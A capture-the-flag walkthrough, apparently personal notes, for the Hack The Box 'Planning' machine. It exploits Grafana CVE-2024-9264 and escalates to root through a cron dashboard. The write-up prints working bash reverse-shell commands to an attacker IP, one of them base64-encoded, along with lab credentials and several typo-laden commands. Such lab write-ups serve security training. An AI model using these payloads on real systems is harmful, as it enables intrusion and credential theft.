
**As in common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r**

- As always we start with the famous `nmap` scan, which reveals the `SSH` port open and the `HTTP` port open (meaning we have a web server)![[Pasted image 20250727114259.png]]

- We enter the web page and we are met with some pages written in `php`![[Pasted image 20250727114545.png]]

- After I checked every page in detail I couldn't find a `login` or similar page where I could put in use the given credentials 
- That means we have to check for subdomains 

- We check for subdomains and we got one result `grafana`
```shell
ffuf -u http://planning.htb -H "Host: FUZZ.plannng.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 178
```
![[Pasted image 20250727115525.png]]

- Add the subdomain `grafana.planning.htb` in `/etc/hosts` then enter the page and I am met with a login page![[Pasted image 20250727115651.png]]

- I input the given credentials and I get to the home page![[Pasted image 20250727115737.png]]

- In the `Help` icon on top left I find the version of Grafana `v11.0.0`![[Pasted image 20250727115959.png]]

- I search the web for some vulnerability for this version and I find the perfect one `CVE-2024-9264`, which I can use to execute arbitrary code remotely
- I also find a GitHub Repo with an exploit for this `CVE` https://github.com/nollium/CVE-2024-9264
- I clone the repo on my machine 
```shell
git clone https://github.com/nollium/CVE-2024-9264
```

- Because I need to import some modules for the script I create a virtual environment:
```shell
python3 -m venv tempenv
source tempenv/bin/activate
```

- I install the required dependencies:
```shell
pip install -r requirements.txt
```

- By running the script as specified in the repo I can run commands as the root of the web-server (but not the root of the target machine)![[Pasted image 20250727135821.png]]

- Now I want to get a reverse shell, so I start my listener
```shell
nc -lvnp 4444
```

- This exploit performs a `DuckDB SQL query` and it is not very friendly with single quotes (`'` ) so I decide to encode in base64 the command to get the reverse shell and use the `CVE-2024-9264` exploit to decode and run the command on the target
```shell
echo "bash -i >& /dev/tcp/10.10.14.41/4444 0>&1" | base64
```
- encoded command in base64:
```base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40MS80NDQ0IDA+JjEK
```
- After running the next command I get the reverse shell:
```shell
python33 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40MS80NDQ0IDA+JjEK | base64 -d | bash" http://grafana.planning.htb"
```
- Now that I have access let's go through the user contents![[Pasted image 20250727141828.png]]

- Searching for something valuable, I use the command `env` to see the environmental variables and it gives me exactly what I needed: the password of the user `enzo`![[Pasted image 20250727142306.png]]

- I have the following account which I can use to `ssh` into the target machine:
	- username: `enzo`
	- password: `RioTecRANDEntANT!`
```shell
ssh enzo@10.10.11.68
Password: RioTecRANDEntANT!
```
![[Pasted image 20250727142529.png]]
- In the `user.txt` file I find the user flag

## Privilege Escalation to root user

- Now that I have access as the `enzo` user I decide to check what files owned by the root I can access/modify
```shell
find / -user root -type f -readable 2>/dev/null
```

- I find a database with cronjobs at `/opt/crontabs/crontab.db`, which could be very useful because I can maybe alter some cronjobs![[Pasted image 20250727143145.png]]
- From the file above I find a password `P4ssw0rdS0pRi0T3c`

- Next I use the command `netstat -tulnp` to see all the active connections available![[Pasted image 20250727143710.png]]
- We see that `127.0.0.1:8000` is active which means that we have another website open on that port

- I `ssh` in the again to `enzo` account but this time I will get access to the port `8000` connection
```ssh
ssh -L 8000:127.0.0.1::8000 enzo@10.10.11.68
Password: RioTecRANDEntANT!
```

- On accessing the `127.0.0.1:8000` web site in my browser, I am met with a log in form and I use the following credentials:
	- user: `root`
	- password: `P4ssw0rdS0pRi0T3c`

- After I log in I get a dashboard with cronjobs![[Pasted image 20250727144438.png]]

- With this goldmine I will try to run a cronjob to get me a shell as the root user
- I press the `New` button to create a new job that will run the following command:
```shell
/bin/bash -c '/bin/bash -i >& /dev/tcp/<your_IP>/4444 0>&1'
```
![[Pasted image 20250727144715.png]]

- I open a listener on my machine with `nc -lvnp 4444` and then I press `Run Now` to run the job and get the shell![[Pasted image 20250727144848.png]]

- So now I got access into the `root` user and I get the flag from `root.txt` ![[Pasted image 20250727145025.png]]
